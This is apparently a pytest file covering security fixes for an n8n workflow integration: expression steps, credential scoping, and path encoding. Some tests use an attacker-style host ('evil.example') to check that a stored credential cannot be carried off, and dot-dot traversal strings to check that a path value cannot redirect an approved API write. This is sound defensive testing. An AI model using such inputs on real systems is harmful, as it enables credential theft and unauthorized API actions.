"""What the whole-branch review of n8n-uses-AIUI found (2026-11-19).

1. A write step that takes data from an earlier step is an n8n EXPRESSION
   body, and it was never approved, so the flagship example ("approve any
   open pull request that says ready") would have been refused on every
   run after the person said yes.
2. The AIUI credential is a plain header credential, and n8n sends it to
   whatever URL the node holding it points at. A workflow could carry it
   anywhere. It may only ride on a node that calls our own route.
3. A value put into a vendor path was not encoded, and httpx folds `..`,
   so an approved write could be walked onto a different endpoint.
4. The route promised never a 500 trace, and n8n must not read a broken
   answer as a success.
"""
import asyncio
import json

import httpx
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

import aiui_link
import automation_keys
import mytools
import routes_tool_run as rt

OWNER = "a@example.com"


def _node(name, url, body=None, cred=None, kind="n8n-nodes-base.httpRequest"):
    node = {"id": name, "name": name, "type": kind, "typeVersion": 4.4,
            "position": [0, 0], "parameters": {"url": url}}
    if body is not None:
        node["parameters"]["jsonBody"] = body
    if cred:
        node["credentials"] = {"httpHeaderAuth": cred}
    return node


AIUI_CRED = {"id": "cred-9", "name": "AIUI"}


# --- 1. an expression body still names its step ------------------------------

def test_an_expression_body_with_a_literal_tool_is_read():
    body = ('={"app": "github", "tool": "review_pull_request", "args": '
            '{"owner": "o", "repo": "r", "number": {{ $json.number }}, '
            '"event": "APPROVE"}}')
    node = _node("Approve", aiui_link.RUN_URL, body, AIUI_CRED)
    assert aiui_link.step_target(node) == ("github", "review_pull_request")


def test_an_expression_that_builds_the_tool_name_names_nothing():
    body = '={"app": "github", "tool": "{{ $json.tool }}", "args": {}}'
    node = _node("Any", aiui_link.RUN_URL, body, AIUI_CRED)
    assert aiui_link.step_target(node) is None


def test_an_expression_naming_two_tools_names_nothing():
    body = ('={"app": "github", "tool": {{ $json.t }}, "args": '
            '{"x": {"tool": "review_pull_request"}}}')
    node = _node("Two", aiui_link.RUN_URL, body, AIUI_CRED)
    assert aiui_link.step_target(node) is None


def test_a_tool_name_quoted_inside_an_argument_is_only_text():
    body = ('={"app": "github", "tool": "list_my_repos", "args": '
            '{"body": "\\"tool\\": \\"write_file\\" {{ $json.x }}"}}')
    node = _node("One", aiui_link.RUN_URL, body, AIUI_CRED)
    assert aiui_link.step_target(node) == ("github", "list_my_repos")


def test_approving_a_workflow_approves_its_expression_write_step(monkeypatch):
    allowed = []

    async def n8n_key(email):
        return {"id": "k", "email": email, "scopes": ["tools"],
                "allowed_writes": [], "n8n_credential_id": "cred-9"}

    async def allow(email, key_id, steps):
        allowed.extend(steps)
    monkeypatch.setattr(automation_keys, "n8n_key", n8n_key)
    monkeypatch.setattr(automation_keys, "allow_writes", allow)
    body = ('={"app": "github", "tool": "review_pull_request", "args": '
            '{"number": {{ $json.number }}, "event": "APPROVE"}}')
    out = asyncio.run(aiui_link.approve_steps(
        OWNER, [_node("Approve", aiui_link.RUN_URL, body, AIUI_CRED)]))
    assert out == ["github.review_pull_request"]
    assert allowed == ["github.review_pull_request"]


def test_the_step_shape_tells_a_model_how_to_pass_item_data():
    import n8n_nodes
    assert "{{ $json" in n8n_nodes.NODES["aiuiTool"].summary


# --- 2. the AIUI credential only rides to our route --------------------------

def test_the_aiui_credential_on_a_node_calling_elsewhere_is_refused():
    with pytest.raises(ValueError) as e:
        aiui_link.check_steps([_node("Leak", "https://evil.example/x",
                                     cred=AIUI_CRED)])
    assert aiui_link.RUN_URL in str(e.value)


def test_the_aiui_credential_on_a_node_with_an_expression_url_is_refused():
    with pytest.raises(ValueError):
        aiui_link.check_steps([_node("Leak", "={{ $json.url }}",
                                     cred=AIUI_CRED)])


def test_the_aiui_credential_on_another_node_type_is_refused():
    with pytest.raises(ValueError):
        aiui_link.check_steps([_node(
            "Leak", aiui_link.RUN_URL, cred=AIUI_CRED,
            kind="@n8n/n8n-nodes-langchain.toolHttpRequest")])


def test_the_remembered_credential_under_another_name_is_refused():
    with pytest.raises(ValueError):
        aiui_link.check_steps(
            [_node("Leak", "https://evil.example/x",
                   cred={"id": "cred-9", "name": "Something else"})],
            credential_id="cred-9")


def test_a_header_credential_of_the_persons_own_passes():
    aiui_link.check_steps(
        [_node("Mine", "https://api.mine.example/x",
               cred={"id": "mine", "name": "My API"})],
        credential_id="cred-9")


def _n8n_world(monkeypatch, key=None, key_error=None):
    sent = []

    async def secrets(email, provider):
        return {"base_url": "https://n8n.example.com", "api_key": "k" * 20}
    monkeypatch.setattr(mytools, "_secrets_for", secrets)

    class _Client:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, params=None,
                          json=None):
            sent.append(url)
            return httpx.Response(200, json={"id": "w1", "name": "x"},
                                  request=httpx.Request(method, url))
    monkeypatch.setattr(mytools.httpx, "AsyncClient", _Client)

    async def no_guard(url):
        return ""
    monkeypatch.setattr(mytools.host_guard, "problem", no_guard)

    async def n8n_key(email):
        if key_error:
            raise key_error
        return key

    async def approve(email, nodes):
        return []
    monkeypatch.setattr(automation_keys, "n8n_key", n8n_key)
    monkeypatch.setattr(aiui_link, "approve_steps", approve)
    return sent


def _workflow(*nodes):
    trigger = {"id": "t", "name": "Start",
               "type": "n8n-nodes-base.manualTrigger", "typeVersion": 1,
               "position": [0, 0], "parameters": {}}
    conns = {"Start": {"main": [[{"node": nodes[0]["name"], "type": "main",
                                  "index": 0}]]}}
    return {"name": "W", "nodes": [trigger, *nodes], "connections": conns}


def _create():
    return {t.name: t for t in mytools.N8N_TOOLS}["create_workflow"]


def test_a_build_carrying_the_remembered_credential_elsewhere_is_refused(
        monkeypatch):
    sent = _n8n_world(monkeypatch, key={"id": "k", "n8n_credential_id":
                                        "cred-9", "allowed_writes": []})
    wf = _workflow(_node("Leak", "https://evil.example/x",
                         cred={"id": "cred-9", "name": "Renamed"}))
    out = asyncio.run(mytools._call("n8n", _create(), OWNER, wf))
    assert out["ok"] is False and aiui_link.RUN_URL in out["error"]
    assert sent == []


def test_a_build_with_the_persons_own_header_credential_goes_through(
        monkeypatch):
    sent = _n8n_world(monkeypatch, key={"id": "k", "n8n_credential_id":
                                        "cred-9", "allowed_writes": []})
    wf = _workflow(_node("Mine", "https://api.mine.example/x",
                         cred={"id": "mine", "name": "My API"}))
    out = asyncio.run(mytools._call("n8n", _create(), OWNER, wf))
    assert out["ok"] is True and len(sent) == 1


def test_a_build_with_credentials_is_refused_when_the_key_cannot_be_read(
        monkeypatch):
    sent = _n8n_world(monkeypatch, key_error=RuntimeError("db down"))
    wf = _workflow(_node("Mine", "https://api.mine.example/x",
                         cred={"id": "mine", "name": "My API"}))
    out = asyncio.run(mytools._call("n8n", _create(), OWNER, wf))
    assert out["ok"] is False and sent == []


def test_a_build_with_no_credentials_needs_no_key_lookup(monkeypatch):
    sent = _n8n_world(monkeypatch, key_error=RuntimeError("db down"))
    wf = _workflow(_node("Plain", "https://example.com"))
    out = asyncio.run(mytools._call("n8n", _create(), OWNER, wf))
    assert out["ok"] is True and len(sent) == 1


# --- 3. a value cannot walk a vendor path ------------------------------------

def _github_world(monkeypatch):
    sent = []

    async def secrets(email, provider):
        return {"token": "T" * 20}
    monkeypatch.setattr(mytools, "_secrets_for", secrets)
    monkeypatch.setattr(mytools, "PREPARE", {})

    class _Client:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def request(self, method, url, headers=None, params=None,
                          json=None):
            sent.append(str(httpx.URL(url)))
            return httpx.Response(200, json={"id": 1},
                                  request=httpx.Request(method, url))
    monkeypatch.setattr(mytools.httpx, "AsyncClient", _Client)
    return sent


_DELETE_TAG = mytools.Tool(
    name="remove_tag", summary="s", method="DELETE",
    path="/repos/{owner}/{repo}/tags/{tag}",
    args={"owner": ("string", "o", True), "repo": ("string", "r", True),
          "tag": ("string", "t", True)})


def test_a_dot_dot_segment_in_a_value_is_refused(monkeypatch):
    sent = _github_world(monkeypatch)
    out = asyncio.run(mytools._call("github", _DELETE_TAG, OWNER, {
        "owner": "o", "repo": "r", "tag": "../../../../user/repos"}))
    assert out["ok"] is False and sent == []


def test_a_question_mark_or_hash_in_a_value_stays_in_its_segment(monkeypatch):
    sent = _github_world(monkeypatch)
    out = asyncio.run(mytools._call("github", _DELETE_TAG, OWNER, {
        "owner": "o", "repo": "r", "tag": "v1?x=1#y"}))
    assert out["ok"] is True
    assert sent[0].endswith("/repos/o/r/tags/v1%3Fx%3D1%23y")


def test_a_slash_in_an_ordinary_value_does_not_add_a_segment(monkeypatch):
    sent = _github_world(monkeypatch)
    asyncio.run(mytools._call("github", _DELETE_TAG, OWNER, {
        "owner": "o", "repo": "r", "tag": "a/b"}))
    assert sent[0].endswith("/repos/o/r/tags/a%2Fb")


def test_a_file_path_keeps_its_slashes(monkeypatch):
    sent = _github_world(monkeypatch)
    tool = {t.name: t for t in mytools.PROVIDER_TOOLS["github"]}["read_file"]
    asyncio.run(mytools._call("github", tool, OWNER, {
        "owner": "o", "repo": "r", "path": "docs/my file.md"}))
    assert sent[0].split("?")[0].endswith("/repos/o/r/contents/docs/my%20file.md")


def test_a_file_path_cannot_climb_either(monkeypatch):
    sent = _github_world(monkeypatch)
    tool = {t.name: t for t in mytools.PROVIDER_TOOLS["github"]}["read_file"]
    out = asyncio.run(mytools._call("github", tool, OWNER, {
        "owner": "o", "repo": "r", "path": "docs/../../../../user"}))
    assert out["ok"] is False and sent == []


# --- 4. the route never answers with a trace ---------------------------------

AUTH = {"Authorization": "Bearer iok_" + "a" * 32}


@pytest.fixture
def client(monkeypatch):
    async def owner_for(key):
        return {"id": "k", "email": OWNER, "scopes": ["tools"],
                "allowed_writes": [], "n8n_credential_id": "c"}
    monkeypatch.setattr(automation_keys, "owner_for", owner_for)
    app = FastAPI()
    app.include_router(rt.router)
    return TestClient(app, raise_server_exceptions=False)


def test_a_credential_store_failure_is_a_502(client, monkeypatch):
    async def boom(email, provider):
        raise RuntimeError("decrypt failed")
    monkeypatch.setattr(mytools, "_secrets_for", boom)
    r = client.post("/tools/run", headers=AUTH,
                    json={"app": "github", "tool": "list_my_repos",
                          "args": {}})
    assert r.status_code == 502 and "GitHub" in r.json()["detail"]


def test_a_tool_that_raises_is_a_502(client, monkeypatch):
    async def secrets(email, provider):
        return {"token": "t"}

    async def boom(provider_id, tool, email, args):
        raise RuntimeError("bug")
    monkeypatch.setattr(mytools, "_secrets_for", secrets)
    monkeypatch.setattr(mytools, "_call", boom)
    r = client.post("/tools/run", headers=AUTH,
                    json={"app": "github", "tool": "list_my_repos",
                          "args": {}})
    assert r.status_code == 502 and "GitHub" in r.json()["detail"]


def test_a_google_answer_that_is_not_json_is_a_502(client, monkeypatch):
    class _Client:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def post(self, url, headers=None, json=None):
            return httpx.Response(200, text="<html>gateway</html>",
                                  request=httpx.Request("POST", url))
    monkeypatch.setattr(rt.httpx, "AsyncClient", _Client)
    r = client.post("/tools/run", headers=AUTH,
                    json={"app": "gdrive", "tool": "gdrive_search_files",
                          "args": {"query": "x"}})
    assert r.status_code == 502


# --- 5. a step must name a real app and tool (live run, 2026-11-19) ----------
#
# The first live build wrote the body as the proxy's own call,
# `{tool: "google-drive_search_drive", arguments: {...}}`, inside
# JSON.stringify. n8n accepted it, AIUI answered 422 "Field required" on
# every run, and the chat had already said "Done".

def test_an_aiui_step_whose_body_names_no_app_is_refused_with_the_shape():
    body = ('={{ JSON.stringify({ tool: "google-drive_search_drive", '
            'arguments: { query: "report" } }) }}')
    with pytest.raises(ValueError) as e:
        aiui_link.check_steps([_node("Drive", aiui_link.RUN_URL, body,
                                     AIUI_CRED)])
    said = str(e.value)
    assert '"app"' in said and '"tool"' in said and '"args"' in said
    assert "gdrive_search_files" in said


def test_an_aiui_step_naming_an_unknown_app_lists_the_apps():
    body = json.dumps({"app": "google-drive", "tool": "search", "args": {}})
    with pytest.raises(ValueError) as e:
        aiui_link.check_steps([_node("Drive", aiui_link.RUN_URL, body,
                                     AIUI_CRED)])
    assert "gdrive" in str(e.value) and "github" in str(e.value)


def test_an_aiui_step_naming_an_unknown_tool_lists_that_apps_tools():
    body = json.dumps({"app": "gdrive", "tool": "search_drive", "args": {}})
    with pytest.raises(ValueError) as e:
        aiui_link.check_steps([_node("Drive", aiui_link.RUN_URL, body,
                                     AIUI_CRED)])
    assert "gdrive_search_files" in str(e.value)


def test_a_well_formed_google_step_passes():
    body = json.dumps({"app": "gdrive", "tool": "gdrive_search_files",
                       "args": {"query": "report"}})
    aiui_link.check_steps([_node("Drive", aiui_link.RUN_URL, body,
                                 AIUI_CRED)])


def test_a_well_formed_catalogue_step_passes():
    body = json.dumps({"app": "github", "tool": "list_my_repos", "args": {}})
    aiui_link.check_steps([_node("Repos", aiui_link.RUN_URL, body,
                                 AIUI_CRED)])
